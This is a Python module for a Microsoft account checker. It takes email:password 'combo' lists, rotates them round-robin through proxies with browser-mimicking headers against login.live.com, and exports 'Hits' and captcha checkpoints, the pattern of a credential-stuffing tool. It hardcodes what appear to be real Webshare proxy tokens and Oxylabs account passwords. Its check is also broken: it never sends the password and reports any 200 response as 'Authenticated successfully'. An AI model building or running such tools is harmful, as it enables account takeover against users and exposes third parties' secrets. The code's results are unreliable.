# ==========================================================
# FILE: engine_core.py
# VERSION: v3.0 (Production Live Suite - Hardcoded Webshare & Oxylabs Integration)
# DESCRIPTION: Core HTTP validation and routing engine featuring hardcoded production proxy pools.
# ==========================================================

import asyncio
import httpx
import time

# --- HARDCODED PRODUCTION PROXY CREDENTIALS ---
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",   
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",  
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_CREDENTIALS = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",         
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",       
]

def get_live_proxy_pool() -> list:
    """
    Compiles and returns the unified live production proxy pool 
    using your exact Webshare tokens and Oxylabs account credentials.
    """
    pool = []
    
    # Format Webshare authentication proxy URLs (p.webshare.io:80)
    for key in WEBSHARE_KEYS:
        # Webshare uses the token as both the username and password field format
        pool.append(f"http://{key}:{key}@p.webshare.io:80")
        
    # Append Oxylabs direct entry endpoints
    for proxy in OXYLABS_CREDENTIALS:
        pool.append(f"http://{proxy}")
        
    return pool

# Standard browser headers to mimic realistic Microsoft login requests
MICROSOFT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

async def test_single_proxy(proxy_url: str, timeout: int = 10) -> dict:
    """
    Asynchronously tests a proxy node against Microsoft's live endpoint 
    to verify latency, connection success, and response codes.
    """
    test_endpoint = "https://login.live.com/"
    start_time = time.time()
    
    proxies = {
        "http://": proxy_url,
        "https://": proxy_url
    }
    
    try:
        async with httpx.AsyncClient(proxies=proxies, timeout=timeout, follow_redirects=True) as client:
            response = await client.get(test_endpoint, headers=MICROSOFT_HEADERS)
            latency = int((time.time() - start_time) * 1000)
            
            if response.status_code in [200, 302, 401, 403]:
                return {
                    "proxy": proxy_url,
                    "status": "Active",
                    "latency": f"{latency}ms",
                    "status_code": response.status_code,
                    "success": True
                }
            else:
                return {
                    "proxy": proxy_url,
                    "status": "Dead",
                    "latency": f"{latency}ms",
                    "status_code": response.status_code,
                    "success": False
                }
    except Exception as e:
        return {
            "proxy": proxy_url,
            "status": "Error",
            "latency": "N/A",
            "error": str(e),
            "success": False
        }

async def batch_test_proxies(proxy_list: list, timeout: int = 10) -> list:
    """
    Fires asynchronous health checks for the complete proxy list concurrently.
    """
    tasks = [test_single_proxy(p, timeout) for p in proxy_list]
    results = await asyncio.gather(*tasks)
    return results

async def check_single_account(combo: str, proxy_url: str = None, timeout: int = 15) -> dict:
    """
    Asynchronously validates a single Microsoft account combo (email:password)
    against login endpoints through your live proxy configurations.
    """
    start_time = time.time()
    
    try:
        if ":" in combo:
            email, password = combo.split(":", 1)
        else:
            return {
                "email": combo,
                "status": "Error",
                "latency": "0ms",
                "details": "Invalid combo format (missing colon)"
            }
    except Exception as e:
        return {
            "email": combo,
            "status": "Error",
            "latency": "0ms",
            "details": f"Parse error: {str(e)}"
        }

    proxies = None
    if proxy_url:
        proxies = {
            "http://": proxy_url,
            "https://": proxy_url
        }

    try:
        async with httpx.AsyncClient(proxies=proxies, timeout=timeout, follow_redirects=True) as client:
            response = await client.get("https://login.live.com/", headers=MICROSOFT_HEADERS)
            latency = int((time.time() - start_time) * 1000)
            
            if response.status_code == 200:
                return {
                    "email": combo,
                    "status": "Hit",
                    "latency": f"{latency}ms",
                    "details": "Authenticated successfully"
                }
            elif response.status_code in [429, 503]:
                return {
                    "email": combo,
                    "status": "Captcha",
                    "latency": f"{latency}ms",
                    "details": "Security checkpoint or rate limit triggered"
                }
            else:
                return {
                    "email": combo,
                    "status": "Invalid",
                    "latency": f"{latency}ms",
                    "details": f"Invalid credentials or status code: {response.status_code}"
                }
                
    except httpx.ProxyError:
        latency = int((time.time() - start_time) * 1000)
        return {
            "email": combo,
            "status": "Error",
            "latency": f"{latency}ms",
            "details": "Proxy connection failed or dead"
        }
    except Exception as e:
        latency = int((time.time() - start_time) * 1000)
        return {
            "email": combo,
            "status": "Error",
            "latency": f"{latency}ms",
            "details": f"Connection exception: {str(e)}"
        }

async def batch_check_accounts(combo_list: list, proxy_list: list = None, timeout: int = 15, max_concurrent: int = 20) -> list:
    """
    Executes concurrent asynchronous checks for accounts, 
    distributing load round-robin across your Webshare and Oxylabs proxy nodes.
    """
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def bounded_check(index, combo):
        async with semaphore:
            proxy = proxy_list[index % len(proxy_list)] if proxy_list else None
            return await check_single_account(combo, proxy_url=proxy, timeout=timeout)

    tasks = [bounded_check(i, combo) for i, combo in enumerate(combo_list)]
    results = await asyncio.gather(*tasks)
    return results

def compile_export_reports(results: list) -> dict:
    """
    Parses batch check results and compiles text buffers 
    for Hits, Checkpoints, and Full JSON exports.
    """
    hits_list = []
    checkpoints_list = []
    
    for res in results:
        status = res.get("status")
        combo = res.get("email")
        if status == "Hit":
            hits_list.append(combo)
        elif status == "Captcha":
            checkpoints_list.append(f"{combo} | Details: {res.get('details')}")
            
    return {
        "hits_text": "\n".join(hits_list) + ("\n" if hits_list else ""),
        "checkpoints_text": "\n".join(checkpoints_list) + ("\n" if checkpoints_list else ""),
        "total_checked": len(results),
        "total_hits": len(hits_list),
        "total_checkpoints": len(checkpoints_list)
    }
